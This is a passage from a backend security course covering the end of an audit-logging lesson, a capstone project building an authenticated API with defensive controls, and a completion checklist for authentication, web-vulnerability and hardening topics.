4. Storing secrets or full PII payloads inside audit metadata.
5. Allowing audit records to be updated or deleted through the normal application code path.

### Interview answer

> "An audit log is a separate, append-only record of security-relevant events — logins, permission changes, access to sensitive data — kept apart from ordinary application logs because those get rotated and sampled and don't have the integrity guarantees an audit trail needs. I log both successes and failures, since failed attempts are often the earlier and more useful signal, and I index by actor and by target so an incident response question like 'what did this account do in the last 30 days' or 'who touched this record' is fast rather than a full table scan under pressure. The other discipline is keeping secrets and full PII dumps out of the audit metadata itself, since the audit log becomes a sensitive asset in its own right the moment it exists."

**Frequently asked:** What's the difference between an audit log and a normal application log? · What events must always be audited? · Why does an audit log need to be append-only? · How would you investigate "was this account compromised" using an audit log?

### Practice — capstone for the phase

Build a small but complete authenticated API demonstrating every control in this phase together:

1. Registration/login with argon2id, constant-response-shape on failure, and rate limiting.
2. Session-based auth for a web client *and* JWT access/refresh with rotation and reuse detection for an API client — implement both to feel the trade-off directly.
3. RBAC for an admin role plus one ABAC rule (resource ownership).
4. CSRF protection on the session-based routes; verify the JWT-only routes are correctly out of CSRF's scope.
5. Output-encoded rendering plus a CSP header; demonstrate an XSS payload is neutralized.
6. An SSRF-hardened "fetch a URL" feature and a correctly allowlisted CORS configuration.
7. Secure cookies, Zod validation rejecting unknown fields, and layered rate limiting.
8. A hardened file-upload endpoint serving from a separate subdomain.
9. Secrets loaded from environment variables with fail-fast checks; no verbose errors leaked to clients.
10. An audit log capturing every event listed above, queryable by actor and target.

Then have someone else (or a fresh instance of yourself, a week later) attempt to break each control, and fix whatever they find.

### Production considerations

- Ship a security checklist (this phase's checklist, below) as a required PR template section for any endpoint touching auth, payments, or PII.
- Run a periodic access review: who has which roles, and does each still make sense.
- Treat every item in this phase as something to *verify with a test*, not just implement — a control with no test regresses silently the first time someone refactors nearby code.

---

## Phase 8 Completion Checklist

You are ready to move on when you can, without looking anything up:

**Authn/Authz**
- [ ] Explain the difference between authentication and authorization, and what BOLA is.
- [ ] Hash a password with argon2id and explain why fast hashes are wrong for this.
- [ ] Explain the user-enumeration defense (dummy hash, identical errors).
- [ ] Build session auth with regeneration on login and a shared store.
- [ ] Build JWT access/refresh auth with pinned algorithms and rotation with reuse detection.
- [ ] Explain RBAC vs ABAC and implement both in one system.
- [ ] Explain OAuth 2.0's authorization code flow with PKCE, and how OIDC differs from OAuth.

**Web vulnerabilities**
- [ ] Demonstrate CSRF against an unprotected cookie-auth endpoint and fix it two ways.
- [ ] Explain why bearer-token APIs are generally outside CSRF's scope.
- [ ] Demonstrate stored XSS and fix it with output encoding, HttpOnly, and CSP.
- [ ] Demonstrate SSRF against a mock internal endpoint and fix it with resolution + allowlisting + redirect re-validation.
- [ ] Explain what CORS does and does not protect against, and the reflected-origin-with-credentials mistake.

**Hardening**
- [ ] Set every cookie attribute correctly and state what each one defends against.
- [ ] Validate input at every trust boundary with a schema that rejects unknown fields.
- [ ] Implement layered, shared-store rate limiting with backoff instead of permanent lockout.
- [ ] Build a file upload endpoint that sniffs content, generates safe filenames, and serves from an isolated origin.
- [ ] Manage secrets outside source control with a fail-fast startup check and a rotation plan.
- [ ] Return generic, consistent error responses in production while logging full detail server-side.
- [ ] Design and query an append-only audit log by actor and by target.

**Backend connection**
- [ ] Explain how Phase 6/7's conditional updates and repository pattern support authorization and idempotent security-sensitive actions.
- [ ] Explain how Phase 4's streaming/backpressure material applies to decompression-bomb defense.
- [ ] State, in one sentence, the theme underlying every section of this phase: never trust the client, never invent your own cryptography, fail closed.

---

**Next:** Phase 9 — Backend Architecture (layered architecture, modular monolith, clean architecture, hexagonal architecture).
